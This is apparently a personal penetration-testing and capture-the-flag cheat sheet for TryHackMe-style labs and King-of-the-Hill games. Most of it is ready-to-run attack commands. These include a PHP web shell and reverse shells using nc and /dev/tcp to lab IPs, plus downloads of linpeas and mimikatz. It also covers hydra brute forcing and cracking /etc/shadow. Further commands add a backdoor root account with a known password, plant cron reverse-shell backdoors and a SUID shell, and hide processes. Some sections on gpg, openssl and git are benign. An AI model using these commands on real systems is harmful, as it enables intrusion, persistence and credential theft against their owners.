# Shell ✅
```bash
/bin/bash -ip
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm‌‌
export SHELL=bash

CTRL + Z
stty raw -echo;fg
reset
xterm‌‌
```
# Payloads_Shell ✅
```bash
<?php echo system($_GET["cmd"]); ?>
nc 10.11.99.141 5555 -e bash
ncat 10.11.99.141 5555 -e bash
/bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
```
[Other_Reverse_Shell_Site](https://www.revshells.com/)
# SSH Proxies
```bash
ssh -L 7777:localhost:8888 user@192.168.0.100
ssh -R 12340:localhost:9999 user@192.168.0.100
ssh -C2qTnN -D 1080 user@target.host
ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10 ssh -t -D 8157 solcoteh@10.10.10.10 -p 222
-oHostKeyAlgorithms=+ssh-rsa
```
# File_Transfer ✅
## linux ✅
```bash
python3 -m http.server 8000
wget http://10.10.10.10:8000/linpeas.sh
curl http://10.10.10.10:8000/linpeas.sh -O linpeas.sh
```
## windows ✅
```bash
certutil -urlcache -split -f http://10.10.10.10:8000/namefile.txt C:\Users\Public\namefile.txt
powershell -c wget "http://10.10.10.10:8000/namefile.txt" -OutFile "C:\Windows\Temp\namefile.txt"
powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:8000/namefile.txt' -OutFile 'C:\Windows\Temp\namefile.txt'"
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/namefile.txt C:\Users\temp\namefile.txt
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10:8000/callhome.exe','callhome.exe')"

c:\Python27\python.exe -c "import urllib; print urllib.urlopen('http://10.10.10.10:8000/mimikatz_trunk.zip').read()" > mimikatz_trunk.zip
```
# Enumeration ✅📚
## Nmap_Enumeration ✅
```bash
sudo nmap -p- <ip> -sV -T5
sudo nmap -p- <ip> -sV -T5 -Pn
sudo nmap 139,445 <ip> -sV -T5 --script=vuln
sudo nmap -p 139,445 <ip> -sV -T5 --script=vuln -Pn
```
## hosts are communicating ✅
```bash
last
lsof -i
lsof -i :80
ss -tulpn
netstat -antp
netstat -antup
netstat -tulpn
grep 80 /etc/services
```
## WEB_Enumeration ✅
### subdomains_enumeration ✡️
```bash
gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt —append-domain -t 100 --no-error 
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com/ -H "Host:FUZZ.example.com" -fw 6
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100
```
### directory _enumeration ✡️
```bash
nikto -h http://example.com

dirb http://example.com
dirb http://example.com -X .php,.html,.bak,.log,.txt,.zip,.enc,.docx
gobuster dir -u http://example.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
gobuster dir -u http://example.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.html,.bak,.log,.txt,.zip,.enc

ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fc 500,404
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e .php,.html,.bak,.log,.txt,.zip,.enc

wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404,500 http://example.com/FUZZ
```
### Wpscan ✡️
```bash
wpscan --url http://<adress>/ -e u (enum user)
wpscan --url http://<adress>/ -e ap (plugin)
```
# Brute Force Attack ✅📚
## Hydra Attack Type Cheat Sheet ✅
```bash
hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
```
### Web_Method Brute Force ✅
```bash
nikto -h http://10.10.131.147:1234/manager/html -id bob:<password> (get-method)
wpscan --url http://<adress>/ --usernames <user> --passwords /usr/share/wordlists/rockyou.txt
hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-get /protected/ -I
hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
```
# Privilege-Escalation ✅📚
## SUID_SGID_Capabilities_Files_enumeration ✅
```
getcap -r / 2>/dev/null 
find /  -perm -04000 -ls 2>/dev/null
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
```
## Privilege-Escalation_enumeration ✅
```bash
id
history
sudo -V
bash --version
cat /etc/sudoers
cat /etc/crontab
uname -a (Linux kernel version)
cat /etc/issue (Linux distribution version) 
cat /etc/*-release (Linux distribution version) 
cat /proc/version (Linux kernel version)
```
## Weak File Permissions ✅
```bash
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Writable /etc/shadow OR /etc/passwd ✡️
```bash
mkpasswd -m sha-512 <new-password>
OR
openssl passwd <password>
OR
openssl passwd -1 -salt <username> <password>

change root password from /etc/shadow OR Add to end the /etc/passwd
Format add to /etc/passwd = <username>:<passwordhash>:0:0:root:/root:/bin/bash

echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
password=Mobin@

su <username> ( Switch to new root user )
```
### Writable /etc/sudoers ✡️
```bash
useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
```

# service ✅📚
## SMB ✅
```bash
enum4linux -a
smbclient -L //<ip>/ -p <port>
smbget -R smb://<ip>/<share>
smbclient //<ip>/<share dir> 
smbclient //<ip>/<share dir> -p <port>
smbclient //<ip>/<share dir> -U Anonymous -p <port>
```
## MySQL ✅
### *enumeration ✡️
```bash
mysql -u root
mysql -u root -p
mysql -h <Hostname> -u root
```
### MySQL commands ✡️
```mysql
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;
SELECT VERSION();
select * from <table>;

SELECT * FROM <table_name> WHERE <column_name> LIKE '%search_string%';
```
## SMTP ✅
```bash
telnet INSERTIPADDRESS 25
nc -nvv INSERTIPADDRESS 25
smtp-user-enum -M <MODE> -u <USER> -t <IP>
nmap <ip> -p <port> -vv -A --script "smtp-*" -oN namp.txt
After finding the username, we will bruteforce <ssh|smb|ftp|nfs> with hydra
```
## NFS ✅
```bash
showmount -e <IP> (print NFS shares)

mkdir /tmp/nfs
sudo mount -o rw -t nfs <IP>:<share> /tmp/nfs/ -nolock

cat /etc/exports (root_squash OR no_root_squash)
```
## SNMP ✅
```bash
snmpwalk -c public -v1 10.0.0.0
snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
snmpcheck -t 192.168.1.X 
snmpcheck -t 192.168.1.X -c public
onesixtyone -c community.txt -i Found_ips.txt
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
snmpenum -t 192.168.1.X
nmap -sV -p 161 --script=snmp* 172.20.10.0/24 -T5
braa <community string>@<IP>:.1.3.6.*
```
# Other_useful_tricks ✅
## gpg command cheetsheet ✅
```bash
gpg --import key.gpg
gpg --import key.asc

gpg -d <file.gpg|pgp>
gpg --batch --yes -d <file.gpg|pgp>
gpg --batch --yes -d <file.gpg|pgp> -o secret.txt  # decrypt 
gpg --batch --yes --passphrase 'passphrase' <file.gpg|pgp> # decrypt 
---------------------------------------------------------
gpg --symmetric --cipher-algo <CIPHER> message.txt # encrypt 
gpg --armor --symmetric --cipher-algo <CIPHER> message.txt # encrypt 
gpg --output original_message.txt --decrypt message.gpg # decrypt 
```
## openssl command cheetsheet ✅
```bash
openssl aes-256-cbc -e -in message.txt -out encrypted_message # encrypt 
openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message # encrypt & more secure 

openssl aes-256-cbc -d -in encrypted_message -out original_message.txt # decrypt 
openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt # decrypt & more secure  
----------------------------------
openssl genrsa -out private-key.pem 2048 # generate an RSA private key
openssl dhparam -out dhparams.pem 2048 # generate an RSA Diffie-Hellman-private-key
openssl rsa -in private-key.pem -pubout -out public-key.pem  # generate an RSA public key from private key
----------------------------------
openssl rsa -in private-key.pem -text -noout
openssl dhparam -in dhparams.pem -text -noout

 # The values of p, q, N, e, and d are prime1, prime2, modulus, publicExponent, and privateExponent, respectively.

openssl x509 -in cert.pem -text # view certificate:
----------------------------------
openssl pkeyutl -encrypt -in plaintext.txt -out ciphertext -inkey public-key.pem -pubin # encrypt a file with public-key 
openssl pkeyutl -decrypt -in ciphertext -inkey private-key.pem -out decrypted.txt  # decrypt a file with private-key

# pkeyutl: This stands for "Public Key Utility" and is a command that lets you perform public key operations, like encryption, decryption, signing, and verification.
---------------------------------
openssl req -new -nodes -newkey rsa:4096 -keyout key.pem -out cert.csr # generate a certificate

openssl req -x509 -newkey -nodes rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365 # generate a self-signed certificate.

```

## ICMP_listener ✅
```bash
sudo tshark -i any -f "icmp"
sudo tcpdump ip proto \\icmp -i tun0
```
# Extract ✅
```bash
tar -xf archive.tar
gzip -d file.gz
7z x file.zip
```
## Git ✅
```bash
git init
git log
git log -p <file>
git diff <commit2> <commit1>
git blame <file>
git show
git checkout <commit|branch ID>
git merge <branch or commit name>
git branch -a
```
# how to use port 22 in firefox ✅
```bash
example = http://hogwartz.com:22
enter "about:config"
search "network.security.ports.banned.override"
Select on "strings"  and [+] 
write "port22"
```
[Other Browser](https://hotspotserver.beabloo.com/unblockPort22.html) 
# install python without root:
```bash
wget https://www.python.org/ftp/python/3.9.9/Python-3.9.9.tgz
tar -zxvf Python-3.9.9.tgz
cd Python-3.9.9.tgz
mkdir ~/.localpython
./configure --prefix=/home/$(whoami)/.localpython
make;make install
```
# Connect OpenVpn
```bash
/usr/sbin/openvpn --config /etc/thm.ovpn # without proxy 
/usr/sbin/openvpn --config /etc/thm.ovpn --socks-proxy 127.0.0.1 10808 # with proxy
```
# useful identifier Hash Tools
```bash
haiti '5460C85BD858A11475115D2DD3A82333' # identity with haiti Tool
hashid '5460C85BD858A11475115D2DD3A82333' # identity with hashid Tool
name-that-hash -t '5460C85BD858A11475115D2DD3A82333' # identity with name-that-hash Tool
hash-identifier '5460C85BD858A11475115D2DD3A82333' # identity with hash-identifier Tool
``` 
# Crack Hash with john
```bash
john --single --format=Raw-MD5  hashfile.txt # Single mode brute force attack
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
```
# Crack zip/rar with john
```bash
# ZIP
zip2john secure.zip  > hashfile.txt
john --format=ZIP  --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
john --format=PKZIP  --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt

 # RAR
rar2john secure.rar  > hashfile.txt
john --format=rar  --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
```
# Machine Tricks ✅📚
## Flag_finder ✅
```bash
grep -iR "THM{" / 2>/dev/null          # flag prefix
grep -R  "VEhN" / 2>/dev/null          # base64
grep -RE '[0-9a-f]{32}' . 2>/dev/null  # hash
find / -name "*flag*"  -ls 2>/dev/null
find / -type f -name "*flag.txt" -o -name ".flag*" -o -name "flag" -o -name "user.txt" -o -name "root.txt"  -ls 2>/dev/null
```
## KoTH Tricks ✅
### Be-king ✅
```bash
set write off
chattr -R +ia /root
chattr -R +ia /root/king.txt
rm -rf /usr/bin/chattr
echo "solcoteh" >| /root/king.txt
lessecho "solcoteh" > /root/king.txt
set -o noclobber /root/king.txt
sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null

while true; do (echo -e 'solcoteh' > /root/king.txt); sleep 0.1; done 2>/dev/null &

echo "#!/bin/bash" > /usr/lib/yo.sh
echo 'echo 'Ap4sh' >| /root/king.txt' >> /usr/lib/yo.sh
echo "/usr/lib/chattr +i /root/king.txt" >> /usr/lib/yo.sh

chmod +x /usr/lib/yo.sh

(crontab -l 2>/dev/null; echo "* * * * * bash /usr/lib/yo.sh") | sudo crontab -
```

### BackDoor ✅
```bash

comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip_address/$port_address 0>&1'"
echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null-

echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.8.118.131/1337 0>&1'\" >> /etc/crontab

cp /bin/sh /home/sh && chmod u+s /home/sh

useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)

echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
password=Mobin@
```
### Not_Be-king ✅
```bash
chattr -R -ia /root
chattr -R -ia /root/king.txt

set +o noclobber /root/king.txt

sudo umount -l /root
sudo umount -l /root/king.txt

wget http://$ip_address:$port_address/chattr
chmod +x chattr
```
### mount-trick ✅
```bash
sudo lessecho solcoteh > /root/king.txt
sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100
sudo mkfs.ext3 /dev/shm/root_f
sudo mkdir /dev/shm/sqashfs
sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/
sudo chmod -R 777 /dev/shm/sqashfs/
sudo lessecho solcoteh > /dev/shm/sqashfs/king.txt
sudo mount -o ro,remount /dev/shm/sqashfs
sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt
sudo rm -rf /dev/shm/root_f 

mkdir /tmp/hidden
echo "$$" (Show our PID)
mount -o bind /tmp/hidden /proc/your-PID-here (Hide your PTS)

mkdir /dev/shm/.hidden && mount -o bind /dev/shm/.hidden /proc/$pid (Hide your PTS)
```
### symbolic-link-Tricks ✅
```bash
cp -r /root/ /dev/shm/...
cd /dev/shm/.../root
rm king.txt
echo "YourNick" > ...
ln -s ... king.txt
```
### Kill_enemy_shell ✅
```bash

tty (If you're looking for your pts id/number)
pkill -9 -t pts/<number>

ps aux
kill -9 $PID

find / -size 36464c 2>/dev/null ( find chattr )

cat /dev/urandom > /dev/pts/# ( sending spam for another user )
cat /dev/urandom > $dir 2>/dev/null

PATH=0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

cat /etc/shells (show available shells)
```
### Tools_Useful ✅
[pspy](https://github.com/DominicBreuker/pspy)
[chisel](https://github.com/jpillora/chisel)
[nyancat](https://github.com/klange/nyancat)
[linpeas.sh](https://github.com/peass-ng/PEASS-ng)
[LinEnum.sh](https://github.com/rebootuser/LinEnum)
[reverse_ssh](https://github.com/NHAS/reverse_ssh)
[linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
[linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
### disable_rootkit ✅
```bash
echo 1 > /proc/sys/kernel/modules_disabled
sudo sysctl -w kernel.modules_disabled=1
sudo sysctl -w module.sig_enforce=1
```
